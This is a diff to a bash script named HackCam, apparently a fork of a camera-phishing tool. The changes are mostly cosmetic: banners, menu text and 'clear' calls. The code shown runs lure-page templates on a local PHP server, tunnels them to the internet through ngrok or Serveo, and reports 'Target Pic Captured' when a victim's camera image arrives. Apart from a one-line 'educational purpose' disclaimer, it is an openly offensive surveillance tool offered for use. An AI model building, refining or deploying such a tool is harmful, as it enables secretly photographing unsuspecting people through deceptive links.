@@ -1,8 +1,5 @@
 #!/bin/bash
-# HackCam v1.0
-# Powered by Sanat Nayak
-# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
-
+clear
 trap 'printf "\n";stop' 2
 
 banner() {
@@ -10,17 +7,25 @@ clear
 
 
                                 
-printf "\e[1;92m██╗  ██╗ █████╗  ██████╗██╗  ██╗  \e[0m\e[1;77m   ██████╗ █████╗ ███╗   ███╗    \e[0m\n"
-printf "\e[1;92m██║  ██║██╔══██╗██╔════╝██║ ██╔╝  \e[0m\e[1;77m  ██╔════╝██╔══██╗████╗ ████║   \e[0m\n"
-printf "\e[1;92m███████║███████║██║     █████╔╝   \e[0m\e[1;77m  ██║     ███████║██╔████╔██║    \e[0m\n"
-printf "\e[1;92m██╔══██║██╔══██║██║     ██╔═██╗   \e[0m\e[1;77m  ██║     ██╔══██║██║╚██╔╝██║    \e[0m\n"
-printf "\e[1;92m██║  ██║██║  ██║╚██████╗██║  ██╗   \e[0m\e[1;77m ╚██████╗██║  ██║██║ ╚═╝ ██║    \e[0m\n"
-printf "\e[1;92m╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   \e[0m\e[1;77m  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝     \e[0m\n"
+printf "\e[1;92m██╗  ██╗ █████╗  ██████╗██╗  ██╗  \e[0m\e[1;31m   ██████╗ █████╗ ███╗   ███╗    \e[0m\n"
+printf "\e[1;92m██║  ██║██╔══██╗██╔════╝██║ ██╔╝  \e[0m\e[1;31m  ██╔════╝██╔══██╗████╗ ████║   \e[0m\n"
+printf "\e[1;92m███████║███████║██║     █████╔╝   \e[0m\e[1;31m  ██║     ███████║██╔████╔██║    \e[0m\n"
+printf "\e[1;92m██╔══██║██╔══██║██║     ██╔═██╗   \e[0m\e[1;31m  ██║     ██╔══██║██║╚██╔╝██║    \e[0m\n"
+printf "\e[1;92m██║  ██║██║  ██║╚██████╗██║  ██╗   \e[0m\e[1;31m ╚██████╗██║  ██║██║ ╚═╝ ██║    \e[0m\n"
+printf "\e[1;92m╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   \e[0m\e[1;31m  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝     \e[0m\n"
 
-printf "\e[1;96m                                                     HackCam V1.0\e[0m\n"
+printf "\e[1;96m                                                     HackCam V2022.4\e[0m\n"
 
-printf "\e[1;77m                    youtube.com/TechnicalSanatHindi \e[0m \n"                                  
-                                                                           
+printf "\e[1;96m                     Grey_Hackers \e[0m \n"    
+printf "\n"                              
+printf "\e[1;34m  #####                                #     #                            \e[0m\n"
+printf "\e[1;34m #     #   ##   #    #   ##   #####    ##    #   ##   #   #   ##   #    # \e[0m\n"
+printf "\e[1;34m #        #  #  ##   #  #  #    #      # #   #  #  #   # #   #  #  #   #  \e[0m\n"
+printf "\e[1;34m  #####  #    # # #  # #    #   #      #  #  # #    #   #   #    # ####   \e[0m\n"
+printf "\e[1;34m       # ###### #  # # ######   #      #   # # ######   #   ###### #  #   \e[0m\n"
+printf "\e[1;34m #     # #    # #   ## #    #   #      #    ## #    #   #   #    # #   #  \e[0m\n"
+printf "\e[1;34m  #####  #    # #    # #    #   #      #     # #    #   #   #    # #    # \e[0m\n"
+                                                                                                                                                     
 printf "\n"
 printf "\e[1;31m  [+]'This Tool Use For Educational Purpose Please Don't Miss Use!'[+]\e[0m\n"
 
@@ -83,7 +88,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Photo Captured!!! 😂😂😂\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m]Target Pic 📷 Captured!!! 🔥🔥🔥🔥\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -144,21 +149,25 @@ printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
 sleep 1
 clear
 banner
-camphish
+hackcam
 else
-printf "\n-----Choose a template----\n"    
+echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !-----Select--Template------!  \e[0m'
+echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
 default_option_template="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Select a template: \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
 fest_name="${fest_name//[[:space:]]/}"
+clear
 elif [[ $option_tem -eq 2 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+clear
 else
-printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
+printf "\e[1;93m ⚠️ Invalid template option! try again\e[0m\n"
 sleep 1
 select_template
 fi
@@ -178,13 +187,17 @@ arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
+clear
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "\e[1;93m ⚠️ Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading wget...\n"
+sudo apt install wget
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Succesesfull...\n"
+clear
 exit 1
 fi
 
@@ -194,8 +207,9 @@ if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
+clear
 else
-printf "\e[1;93m[!] Download error... \e[0m\n"
+printf "\e[1;93m ⚠️ Download error... \e[0m\n"
 exit 1
 fi
 fi
@@ -213,10 +227,17 @@ else
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
 fi
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !  PHP Server Starting      !  \e[0m'
+echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
+echo ""
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !      Starting Ngrok       !  \e[0m'
+echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
+echo ""
+echo ""
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
@@ -240,25 +261,29 @@ if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
 
-printf "\n-----Choose tunnel server----\n"    
+echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !------Select--Server-------!  \e[0m'
+echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Select a Port Forwarding option:- \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 select_template
 if [[ $option_server -eq 2 ]]; then
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 start
+clear
 
 elif [[ $option_server -eq 1 ]]; then
 ngrok_server
+clear
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+printf "\e[1;93m ⚠️ Invalid option!\e[0m\n"
 sleep 1
 clear
-HackCam
+hackcam
 fi
 
 }
